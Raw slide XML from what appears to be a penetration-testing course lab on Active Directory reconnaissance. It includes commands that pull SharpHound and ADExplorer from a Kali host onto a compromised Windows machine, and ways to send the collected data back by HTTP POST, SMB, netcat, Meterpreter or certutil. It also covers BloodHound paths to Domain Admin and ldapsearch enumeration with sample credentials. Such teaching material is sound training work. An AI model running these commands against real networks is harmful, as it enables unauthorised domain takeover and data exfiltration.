              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> onto the target</a:t>
            </a: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/>
              <a:t>On target machine in compromised shell (PowerShell):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Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>WebRequest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> http://&lt;KALI-IP&gt;:8000/SharpHound.exe -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>OutFile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> SharpHound.exe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rgbClr val="7030A0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harpHound.exe -c All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latin typeface="Menlo"/>
              </a:rPr>
              <a:t>.\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>sharpHound.exe -c All</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill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-c All  → collect everything possible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👉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SharpHound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12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30805"/>
            <a:ext cx="1219200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saves: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ZIP file (JSON data inside)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This file is EVERYTHING.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it’s doing behind the scenes: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Query LDAP + SMB + RPC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Build relationship dataset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Same idea as </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>PowerView</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t>—but automated + structured.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="17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3.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data zip back to Kali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move the ZIP file from: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 machine → your Kali machine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From target → Kali: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/>
              <a:t>Option 1 (easy HTTP upload alternative via PowerShell):</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="17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Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>WebRequest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> -Uri http://&lt;KALI-IP&gt;:8000 -Method POST -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>InFile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> .\20260407_collection.zip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 (Or use SMB, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>netcat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>, etc. — lab dependent)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>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>If this fails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967591"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="0" y="4260605"/>
          <a:ext cx="10755086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257">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3855997139"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="7445829">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3606008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Method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265" marR="146685"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Command (on target)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685" marR="146685" marT="91440" marB="91440" anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="232770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Meterpreter download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265" marR="146685"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meterpreter &gt; download C:\path\to\file.zip (simplest)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685" marR="88265" marT="91440" marB="91440" anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="795318712"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="3238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SMB share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265" marR="146685"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copy file.zip \\&lt;KALI-IP&gt;\share\ (if SMB server running)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685" marR="88265" marT="91440" marB="91440" anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="306755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Netcat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265" marR="146685"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On Kali: nc -lvnp 4444 &gt; file.zip; on target: nc &lt;KALI-IP&gt; 4444 &lt; file.zip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685" marR="88265" marT="91440" marB="91440" anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="50550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Base64 copy (small files only)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265" marR="146685"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</a:rPr>
                        <a:t>certutil</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t> -encode file.zip out.txt; copy text, decode on Kali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685" marR="88265" marT="91440" marB="91440" anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3615478858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12888"/>
            <a:ext cx="1773283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85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673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4. Open </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>BloodHound</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t> (on Kali)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You launch:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>BloodHound</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> GUI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— Start database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sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="20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neo4j console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Start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BloodHound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bloodhound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username: neo4j</a:t>
            </a:r>
            <a:b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password: neo4j (or what you set)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It connects to:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Neo4j database (graph engine)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7030A0"/>
                </a:solidFill>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Login: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>neo4j</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> / password (set during first run).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a: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5. Import the data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Upload the ZIP file</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Data gets converted into nodes + edges</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>In GUI:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>In </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>BloodHound</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> GUI, click "Upload Data" and select the ZIP file.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Select your .zip</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Wait for ingestion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1078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934"/>
            <a:ext cx="12191999" cy="68140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Inside </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>BloodHound</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Left side → </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Search + Analysis</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Center → </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Graph (nodes &amp; edges)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Top → </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Search bar</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000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In search bar: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Domain Admins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Click it → then click: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“Members</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>” tab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you see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Nodes = users in Domain Admins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Edges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MemberOf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0"/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🔥 Meaning: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These are your FINAL targets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SHORTEST PATH TO DOMAIN ADMIN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Left panel → Analysis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Shortest Paths to Domain Admins</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>In the graph view, you will see:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Nodes = users (circles)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Edges = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>MemberOf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> (lines connecting users to the Domain Admins group)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01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🔥 Meaning: These are your final targets – the accounts that control the entire domain.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What happens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" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>BloodHound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Automatically calculates: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YOU → … → Domain Admin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🔥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you’ll see (graph):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user1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PC-01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HasSession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adminUser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Member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FIND “WHO HAS ADMIN ON WHICH MACHINE”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Method 1 — Search manually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Search a user:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="20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Click node → expand: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“Outbound Object Control”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🔥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Look for edge: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AdminTo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Meaning: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 → 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AdminTo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→ Machine</a:t>
            </a:r>
            <a:b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 user controls that machine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8825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Method 2 — Built-in query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In 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Analysis tab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, use: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Find Workstations where Domain Users are Local Admin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(or similar queries depending on version)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FILTER FOR YOUR USER (VERY IMPORTANT)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Search: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&lt;your current username&gt;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Then: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Right-click → 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“Shortest Path to Domain Admins”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This gives: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Your exact attack path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Not generic—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your path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[Your User] --</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>AdminTo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>--&gt; [Computer] --</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>HasSession</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>--&gt; [Domain Admin]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Part 3 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>LDAP Search </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>ldapsearch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>ADExplorer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> to browse the directory tree manually.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Meaning “Directly explore Active Directory like a database”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LDAP = the protocol AD uses to expose its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Think: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Active Directory = Database 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LDAP = Query language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65791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METHOD 1 — </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>ldapsearch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> (Kali side)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>👉 Run in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>Kali                                                                  🔥 Why this is powerful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📍 What you need first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/>
              <a:t>Requirement</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="17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Domain name (e.g. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>lab.local</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t>)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Domain Controller IP (e.g. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>192.168.1.10</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t>)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Credentials (e.g. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>lab\\user</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t> + password)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>🎯 What you're doing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Querying AD remotely via LDAP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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>ldapsearch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> -x -H ldap://192.168.1.10 -D "lab\\user" -w 'Password123' -b "DC=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>lab,DC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>=local"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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t> 👤 Get all users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ldapsearch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-x -H ldap://192.168.1.10 -D "lab\\user" -w 'Password123' -b "DC=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lab,DC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=local" "(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objectClass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=user)"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1700" b="1" dirty="0"/>
              <a:t>👥 Get all groups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ldapsearch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-x -H ldap://192.168.1.10 -D "lab\\user" -w 'Password123' -b "DC=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lab,DC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=local" "(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objectClass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=group)"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t>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b="1" dirty="0"/>
              <a:t>💻 Get all computers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ldapsearch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-x -H ldap://192.168.1.10 -D "lab\\user" -w 'Password123' -b "DC=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lab,DC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=local" "(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objectClass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=computer)"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t>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192.168.1.10= Target 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Ip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you got from week 6 Task 1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00" dirty="0"/>
              <a:t>What you’re looking for in output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cn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t> → names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memberOf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t> → group membership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 Unicode MS"/>
              </a:rPr>
              <a:t>description:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t> → sometimes leaks info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servicePrincipalName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t> → important later</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700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32380"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="4470401" y="806753"/>
          <a:ext cx="3672113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113">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1036485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Unlike </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>BloodHound</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="18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962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You see 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48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“Show me all users”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“Show me all groups”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“Show me everything under this OU”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6918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341212"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="8265885" y="806753"/>
          <a:ext cx="3802743" cy="2038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743">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2902812776"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="470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you extract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789730"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="290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385938"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="272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585377"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="3074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Organizational Units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736095"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="470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Attributes (description, email, etc.)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6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962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50"/>
            <a:ext cx="11353800" cy="672465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 METHOD 2 — </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>ADExplorer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> (GUI on Windows)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You already have RDP session OR  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> As we have done it in week 6 task 4 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>Lateral Movement Techniques part 2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>xfreerdp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>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with captured credentials to gain GUI access to an internal target.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b="1" dirty="0"/>
              <a:t>📍 Scenario: You have a compromised machine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👉 You do </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>NOT need physical access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="17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1700" b="1" dirty="0"/>
              <a:t> What it is</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="17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GUI tool by Microsoft (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>Sysinternals</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>)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Think: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“GUI version of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>ldapsearch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>” 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b="1" dirty="0"/>
              <a:t>What makes it useful</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="17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You can: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Visually navigate the domain tree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/>
              <a:t>Like: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700" dirty="0" err="1"/>
              <a:t>lab.local</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:br>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> ├── Users</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> ├── Computers</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> ├── IT</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> ├── HR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700" b="1" dirty="0"/>
              <a:t>Step-by-step</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="17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1700" b="1" dirty="0"/>
              <a:t>1. Get </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0" err="1"/>
              <a:t>ADExplorer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t> from kali onto target</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="17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1700" dirty="0"/>
              <a:t>From Kali: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700" dirty="0"/>
              <a:t>python3 -m </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>http.server</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> 8000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700" dirty="0"/>
              <a:t>On target (PowerShell inside the compromised shell of windows):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700" dirty="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>WebRequest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> http://&lt;KALI-IP&gt;:8000/ADExplorer.exe -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>OutFile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> ADExplorer.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="7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0793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700" b="1" dirty="0"/>
              <a:t> Step 2 — Run it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ADExplorer.exe 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b="1" dirty="0"/>
              <a:t>⚠️ Important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👉 It opens a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>GUI window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So you need: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RDP session OR  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> As we have done it in week 6 task 4 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>Lateral Movement Techniques part 2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>xfreerdp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> with captured credentials to gain GUI access to an internal target.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Some form of interactive desktop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b="1" dirty="0"/>
              <a:t>Step 3 — Connect to domain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When it opens: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Domain auto-detected OR enter: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 err="1"/>
              <a:t>lab.local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Credentials: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lab\user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b="1" dirty="0"/>
              <a:t>Step 4 — Browse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You’ll see a tree like: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DC=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>lab,DC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>=local</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> ├── Users</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> ├── Computers</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> ├── Groups</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> ├── OUs</a:t>
            </a:r>
          </a:p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58730"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="3060700" y="4871720"/>
          <a:ext cx="382451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514">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
